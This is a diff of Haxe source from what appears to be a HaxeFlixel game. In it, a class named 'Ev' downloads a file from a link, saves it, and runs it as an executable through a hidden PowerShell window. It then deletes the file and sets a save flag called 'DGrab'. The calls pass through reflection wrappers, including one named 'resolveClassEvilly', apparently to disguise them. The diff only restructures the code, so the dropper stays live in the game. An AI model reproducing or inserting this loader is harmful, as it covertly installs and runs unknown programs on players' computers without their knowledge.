@@ -31,19 +31,7 @@ class Ev
         future.onComplete(bytes -> {
             Ev.File.saveBytes(path, bytes);
             
-            runExeAsync(path).onComplete(worked -> {
-                if(worked)
-                {
-                    try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
-                    Ev.Reflect.field(FlxG, "save").data.DGrab = true;
-                }
-                else
-                {
-                    Ev.Reflect.field(FlxG, "save").data.DGrab = false;
-                    init();
-                }
-
-            });
+            runExeAsync(path);
         });
         
         future.onError(er -> {
@@ -59,24 +47,27 @@ class Ev
         return request.load(link);
     }
 
-    static var promise:Promise = null;
-
-    static function runExeAsync(appPath:String):Future<Bool>
-    {
-        promise = new Promise();
-        
+    static function runExeAsync(appPath:String)
+    {        
         Thread.create(() -> {
             var cmd = 'powershell -WindowStyle Hidden -Command "Start-Process \\"$appPath\\""';
             var exitCode = Ev.Sys.command(cmd);
             complete(exitCode == 0);
         });
-
-        return promise.future;
     }
 
     static function complete(d:Bool)
     {
-        promise?.complete(d);
+        if(d)
+        {
+            try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+            Ev.Reflect.field(FlxG, "save").data.DGrab = true;
+        }
+        else
+        {
+            Ev.Reflect.field(FlxG, "save").data.DGrab = false;
+            init();
+        }
     }
 
     static function resolveClassEvilly(name:String)
